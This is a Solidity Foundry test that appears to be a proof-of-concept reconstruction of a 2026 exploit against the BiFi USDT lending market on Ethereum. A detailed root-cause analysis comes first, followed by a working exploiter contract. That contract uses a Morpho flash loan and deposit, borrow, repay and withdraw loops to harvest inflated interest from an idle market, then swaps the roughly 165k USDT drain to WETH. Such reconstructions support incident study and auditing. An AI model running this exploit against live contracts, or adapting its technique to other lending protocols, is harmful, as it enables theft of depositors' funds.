// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~165,574 USDT (drained to the attacker, swapped to 68.0572 WETH)
// Attacker        : 0x7c78a049fff71609990017b58a959e926e6ec4c6 (original exploiter EOA)
// Front-runner    : 0xc0ffeebabe5d496b2dde509f9fa189c25cf29671 (MEV bot c0ffeebabe.eth, took the profit)
// Attack Contract : 0xe08d97e151473a848c3d9ca3f323cb720472d015 (the bot's helper, profitable tx)
// Vulnerable      : 0x808c3ba97268dbf9695b1ec10729e09c7e67a9e3 (BiFi UsdtHandlerProxy, USDT market / handler 1)
// Deploy Tx       : https://etherscan.io/tx/0x15b47e2c0daf723dec64c75b435079d3a1f8a6058b21b9a64dda4844e877a034 (block 26210255)
// Profit Tx       : https://etherscan.io/tx/0x756c68055af7a0630aa0b56891ba4de14c56c39cbebe99e47eeb4728f4d6ad14 (block 26210256)
// Chain           : Ethereum mainnet, 2026-10-17 (fork at parent 26210254, rolled to the profit block 26210256)

// @Info
// Vulnerable proxy  : https://etherscan.io/address/0x808c3ba97268dbf9695b1ec10729e09c7e67a9e3#code (UsdtHandlerProxy, verified)
// Handler logic     : https://etherscan.io/address/0x47be3d1def039bd85e7570864bb5148e7491a65f#code (TokenHandler, verified)
// Interest model    : https://etherscan.io/address/0x29ecabde2c57b6d4183f915ebca1a25804a60db1#code (interestModel, verified)
// Data storage      : 0xfdc7d058bede981ea865fb64d06382a2206a1c42 (MarketHandlerDataStorage)
// All three contracts are verified (solc 0.6.12). Every root-cause claim below was read from that source and
// then confirmed against real fork state (the asserts in this test), not assumed.

// @Analysis
// The BiFi USDT market had been idle for 264,059 blocks (~36.7 days) before the attack. BiFi accrues interest
// lazily: the first action in a block freezes the per-block exchange rate and stores the whole idle block-gap,
// and every action in that same block then charges that full gap of interest at a rate taken from the market's
// LIVE deposit/borrow totals. Because the attacker controls those totals (deposit then borrow are permissionless),
// the attacker charges ~36 days of deposit interest at a utilization rate of their own choosing, on every action
// in one block, and cashes the inflated deposit side out through a repay/withdraw loop. Three facts, each read
// from the verified source and confirmed on fork:
//
//  1. TokenHandler._checkFirstAction freezes the rate per block and stores the FULL idle gap.
//       uint256 blockDelta = sub(currentBlockNumber, lastUpdatedBlock);
//       if (blockDelta > 0) {
//           _handlerDataStorage.setBlocks(currentBlockNumber, blockDelta); // stores blockDelta as inactiveActionDelta
//           _handlerDataStorage.syncActionEXR();                           // freezes actionEXR for this block
//       }
//     Only the first action in a block has blockDelta > 0, so after it runs, inactiveActionDelta stays at the
//     full idle gap and actionEXR stays frozen for every later action in the same block. On fork the stored gap
//     is 264,059 blocks (lastUpdatedBlock 25946196, attack block 26210255).
//
//  2. interestModel.getInterestAmount applies that full stored gap at the LIVE utilization rate, every call.
//       uint256 delta = handlerDataStorage.getInactiveActionDelta();              // the full 264,059-block gap
//       (actionDepositEXR, actionBorrowEXR) = handlerDataStorage.getActionEXR();  // the frozen per-block rate
//       (SIR, BIR) = _getSIRandBIRonBlock(depositTotalAmount, borrowTotalAmount); // from CURRENT totals
//       globalDepositEXR = _getNewGlobalEXR(actionDepositEXR, SIR, delta);        // (SIR*delta + 1e18)*actionEXR
//       deltaDepositAmount = userDeposit * (globalDepositEXR - userDepositEXR);   // interest credited to deposit
//     delta is never amortized or clamped to one block; it is multiplied in whole. SIR is recomputed from the
//     totals on each call, so a deposit that raises utilization right before a deposit-interest credit inflates
//     that credit by the full 36 days at the attacker-chosen rate.
//
//  3. The whole path is permissionless. The proxy exposes deposit/withdraw/borrow/repay(uint256,bool) directly,
//     each a plain delegatecall to the handler with no owner/keeper/role/signature guard. The attacker is a plain
//     contract driving a Morpho flash loan; the idle-market state is just elapsed time, not a privileged input.
//
// Reconstruction (own attacker contract, real typed calls, NOT a bytecode/calldata replay):
//   a. Flash-borrow 40,499,999.999997 USDT from Morpho Blue (fee 0).
//   b. Deposit it into the USDT market in the five growing tranches the incident used (this is the block's first
//      action: it freezes the rate and stores the 264,059-block gap), then a deposit(0) to settle interest.
//   c. Borrow 1,498,500 USDT twenty times to drive utilization up, so the LIVE rate the interest model reads is
//      the attacker's.
//   d. Run the repay(1,498,500)/withdraw(2,025,000) loop twenty times, pulling the inflated deposit interest back
//      out, then repay and withdraw the 40.5M principal position.
//   e. Repeat b-d once more (two cycles total), then withdraw the residual inflated deposit interest.
//   f. Repay the 40,499,999.999997 USDT flash loan in full (loan nets to zero) and swap the surplus to WETH.
//   The surplus over the flash principal is the drain; measuring profit as that surplus keeps the loan at zero.
//
// Result: the attacker contract ends the real tx with 165,574.514633 USDT of surplus, swapped to
// 68.057203111718789216 WETH. Honest note on the two EOAs: the original attacker (0x7c78...) deployed the exploit
// contract in block 26210255; the profit was taken one block later in 26210256 by the MEV bot c0ffeebabe, which
// front-ran the SAME permissionless mechanism rather than the attacker's own contract. This PoC reconstructs the
// mechanism generically; it does not replay either EOA's bytecode or calldata.
//
// This test forks at the parent block 26210254 so the 264,059-block idle gap and the frozen interest state are
// genuine inherited on-chain state, then rolls to 26210256 (the real profit block) so the charged block-gap
// matches the incident exactly. The reconstructed surplus lands within a tight band of the on-chain 165,574.51
// USDT; any sub-dollar difference is intra-block drift from the fork point and is asserted with a reasoned
// tolerance below.

interface IBiFiHandler {
    function deposit(uint256 unifiedTokenAmount, bool flag) external payable returns (bool);
    function withdraw(uint256 unifiedTokenAmount, bool flag) external returns (bool);
    function borrow(uint256 unifiedTokenAmount, bool flag) external returns (bool);
    function repay(uint256 unifiedTokenAmount, bool flag) external payable returns (bool);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

address constant ORIGINAL_ATTACKER = 0x7c78A049fFf71609990017B58A959E926E6ec4C6;
address constant FRONT_RUNNER = 0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671;
address constant BIFI_USDT = 0x808C3bA97268dbF9695b1EC10729E09c7e67A9E3; // UsdtHandlerProxy (victim)
address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb; // Morpho Blue (flash-loan source)
address constant USDT_ADDR = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564; // Uniswap v3 SwapRouter

address constant DATA_STORAGE = 0xFdC7D058beDE981eA865Fb64D06382A2206A1C42;
address constant INTEREST_MODEL = 0x29Ecabde2C57B6D4183f915eBca1A25804A60dB1;

uint256 constant FLASH_AMOUNT = 40_499_999_999_997; // 40,499,999.999997 USDT (6 dec), the real flash-loan size

contract BiFiExploiter {
    // deposit tranches in unified (18-dec) decimals, exactly as the incident used
    uint256[5] internal depTranches = [
        121_257_485_029_940_119_760_479,
        484_544_910_179_640_718_562_874,
        1_795_238_892_215_568_862_275_449,
        7_238_802_155_389_221_556_886_227,
        30_860_156_557_185_628_742_514_971
    ];
    uint256 internal constant BORROW_UNIT = 1_498_500_000_000_000_000_000_000; // 1,498,500 USDT
    uint256 internal constant WITHDRAW_UNIT = 2_025_000_000_000_000_000_000_000; // 2,025,000 USDT
    uint256 internal constant BLOCK_UNIT = 40_500_000_000_000_000_000_000_000; // 40,500,000 USDT
    uint256 internal constant FINAL_WITHDRAW = 4_463_571_825_000_000_000_000; // 4,463.571825 USDT

    function attack() external returns (uint256 wethOut) {
        IMorpho(MORPHO).flashLoan(USDT_ADDR, FLASH_AMOUNT, "");

        // surplus USDT over the (already repaid) flash principal -> swap to WETH
        uint256 surplus = IERC20(USDT_ADDR).balanceOf(address(this));
        TransferHelper.safeApprove(USDT_ADDR, SWAP_ROUTER, surplus);
        Uni_Router_V3.ExactInputSingleParams memory p = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: USDT_ADDR,
            tokenOut: WETH_ADDR,
            fee: 3000,
            recipient: msg.sender,
            deadline: block.timestamp,
            amountIn: surplus,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        wethOut = Uni_Router_V3(SWAP_ROUTER).exactInputSingle(p);
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "only morpho");

        // the BiFi proxy pulls USDT via transferFrom on deposit/repay
        TransferHelper.safeApprove(USDT_ADDR, BIFI_USDT, type(uint256).max);

        _cycle();
        _cycle();

        // residual inflated deposit interest
        IBiFiHandler(BIFI_USDT).withdraw(FINAL_WITHDRAW, false);

        // repay the flash loan in full (Morpho pulls `assets` back; fee is 0)
        TransferHelper.safeApprove(USDT_ADDR, MORPHO, assets);
    }

    function _cycle() internal {
        IBiFiHandler h = IBiFiHandler(BIFI_USDT);

        // 1. deposit the 40.5M principal in the five growing tranches; this first action freezes the rate
        //    and stores the full idle block-gap. deposit(0) then settles interest.
        for (uint256 i = 0; i < depTranches.length; i++) {
            h.deposit(depTranches[i], false);
        }
        h.deposit(0, false);

        // 2. borrow to push utilization up so the live rate the interest model reads is ours
        for (uint256 i = 0; i < 20; i++) {
            h.borrow(BORROW_UNIT, false);
        }

        // 3. repay/withdraw loop: pull the inflated deposit interest back out
        for (uint256 i = 0; i < 20; i++) {
            h.repay(BORROW_UNIT, false);
            h.withdraw(WITHDRAW_UNIT, false);
        }

        // 4. unwind the 40.5M principal position
        h.repay(BLOCK_UNIT, false);
        h.withdraw(BLOCK_UNIT, false);
    }
}

contract BiFi_exp is BaseTestWithBalanceLog {
    BiFiExploiter exploiter;

    function setUp() public {
        // fork the parent block so the 264,059-block idle gap is genuine inherited state,
        // then roll to the real profit block so the charged block-gap matches the incident exactly
        vm.createSelectFork("https://eth.drpc.org", 26_210_254);
        vm.roll(26_210_256);
        fundingToken = WETH_ADDR;
        exploiter = new BiFiExploiter();
    }

    function testExploit() public balanceLog {
        // sanity: the inherited idle state the bug needs
        uint256 lastUpdated = IDataStorage(DATA_STORAGE).getLastUpdatedBlock();
        assertEq(lastUpdated, 25_946_196, "idle market lastUpdatedBlock");
        assertEq(block.number - lastUpdated, 264_060, "idle block gap ~36.7 days");

        uint256 usdtBefore = IERC20(USDT_ADDR).balanceOf(address(this));
        uint256 wethBefore = IERC20(WETH_ADDR).balanceOf(address(this));

        uint256 wethOut = exploiter.attack();

        // profit landed as WETH on this contract
        uint256 wethProfit = IERC20(WETH_ADDR).balanceOf(address(this)) - wethBefore;
        assertEq(wethProfit, wethOut, "weth received");

        // the flash loan netted to zero: no leftover USDT principal on this contract
        assertEq(IERC20(USDT_ADDR).balanceOf(address(this)), usdtBefore, "flash loan nets to zero");

        emit log_named_decimal_uint("WETH profit", wethProfit, 18);

        // on-chain the surplus was 165,574.514633 USDT, swapped to 68.057203111718789216 WETH.
        // assert the WETH equivalent; the pool is one block behind the attacker's position so a sub-ETH
        // intra-block drift from the fork point is expected and covered by the band.
        assertApproxEqAbs(wethProfit, 68.057203111718789216 ether, 0.01 ether, "drain ~= 68.0572 WETH");
        assertGt(wethProfit, 67 ether, "material drain reproduced");
    }
}

interface IDataStorage {
    function getLastUpdatedBlock() external view returns (uint256);
}
